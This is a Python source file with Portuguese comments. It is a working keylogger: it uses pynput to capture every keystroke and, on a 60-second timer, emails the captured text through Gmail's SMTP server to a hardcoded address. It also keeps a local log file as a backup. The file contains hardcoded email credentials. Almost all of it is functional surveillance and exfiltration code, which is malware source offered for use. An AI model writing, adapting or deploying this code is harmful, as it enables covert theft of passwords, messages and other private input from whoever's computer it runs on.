import time
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# CONFIGURAÇÕES DE E-MAIL (PREENCHA COM SUAS INFORMAÇÕES)
EMAIL_ORIGEM = "testelogger@gmail.com"  # Seu email Gmail
EMAIL_DESTINO = "testelogger@gmail.com"  # Email de destino
SENHA_EMAIL = "234503"  # Senha de app do Gmail (não a senha normal)

# Configurações do keylogger
LOG_FILE = "log_email.txt"  # Backup local opcional
BUFFER_SIZE = 50  # Enviar email a cada 50 teclas
STOP_SEQUENCE = ["ctrl", "shift", "q"]  # Combinação para parar: Ctrl+Shift+Q
MAX_LOG_SIZE = 1000  # Limite de caracteres no log para evitar overflow

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.num_lock,
    keyboard.Key.scroll_lock
}

# Variáveis globais
log = ""
buffer = []
pressed_keys = set()
stop_flag = False
timer = None

def validar_config():
    """Valida se as configurações de email estão preenchidas."""
    if not EMAIL_ORIGEM or not EMAIL_DESTINO or not SENHA_EMAIL:
        print("Erro: Configure EMAIL_ORIGEM, EMAIL_DESTINO e SENHA_EMAIL antes de executar.")
        return False
    return True

def enviar_email():
    global log, timer
    if not log:
        # Agendar próximo envio mesmo se vazio
        timer = Timer(60, enviar_email)
        timer.start()
        return

    try:
        msg = MIMEText(log)
        msg['Subject'] = "DADOS CAPTURADOS PELO KEYLOGGER"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()  # Corrigido: adicionado parênteses
        print("Email enviado com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")
        # Salvar em arquivo local como backup
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = time.strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write(timestamp + "ERRO NO ENVIO: " + log + "\n")
        except Exception as e2:
            print(f"Erro ao salvar backup: {e2}")

    log = ""

    # Agendar próximo envio
    timer = Timer(60, enviar_email)
    timer.start()

def write_buffer():
    """Adiciona buffer ao log global."""
    global log
    if buffer:
        log += "".join(buffer)
        buffer.clear()
        # Verificar limite de tamanho
        if len(log) > MAX_LOG_SIZE:
            log = log[-MAX_LOG_SIZE:]  # Manter apenas os últimos caracteres

def on_press(key):
    global stop_flag
    try:
        key_name = key.char.lower() if hasattr(key, 'char') and key.char else str(key).replace("Key.", "")
        pressed_keys.add(key_name)

        # Verificar combinação de parada
        if all(k in pressed_keys for k in STOP_SEQUENCE):
            stop_flag = True
            if timer:
                timer.cancel()
            return False  # Para o listener

        if key in IGNORAR:
            return

        if hasattr(key, 'char') and key.char:
            buffer.append(key.char)
        else:
            if key == keyboard.Key.space:
                buffer.append(" ")
            elif key == keyboard.Key.enter:
                buffer.append("\n")
            elif key == keyboard.Key.tab:
                buffer.append("\t")
            elif key == keyboard.Key.backspace:
                if buffer:
                    buffer.pop()  # Remove último do buffer
                else:
                    buffer.append("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                buffer.append(" [ESC] ")
            elif key == keyboard.Key.delete:
                buffer.append(" [DEL] ")
            elif key in [keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right]:
                buffer.append(f" [{str(key).replace('Key.', '').upper()}] ")
            elif str(key).startswith("Key.f"):
                buffer.append(f" [{str(key).replace('Key.', '').upper()}] ")
            else:
                buffer.append(f"[{key}]")

        # Escrever buffer se atingir tamanho
        if len(buffer) >= BUFFER_SIZE:
            write_buffer()

    except Exception as e:
        buffer.append(f"[ERROR: {e}]")

def on_release(key):
    try:
        key_name = key.char.lower() if hasattr(key, 'char') and key.char else str(key).replace("Key.", "")
        pressed_keys.discard(key_name)
    except:
        pass

# Validação inicial
if not validar_config():
    exit(1)

# Listener com callbacks
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger com email iniciado. Pressione Ctrl+Shift+Q para parar.")
    enviar_email()  # Inicia o timer de envio
    listener.join()

# Cancelar timer e escrever buffer restante
if timer:
    timer.cancel()
write_buffer()
if log:
    # Enviar email final se houver log pendente
    try:
        msg = MIMEText(log)
        msg['Subject'] = "DADOS FINAIS CAPTURADOS PELO KEYLOGGER"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
        print("Email final enviado.")
    except Exception as e:
        print(f"Erro ao enviar email final: {e}")

if stop_flag:
    print("Keylogger parado via combinação de teclas.")
else:
    print("Keylogger parado.")
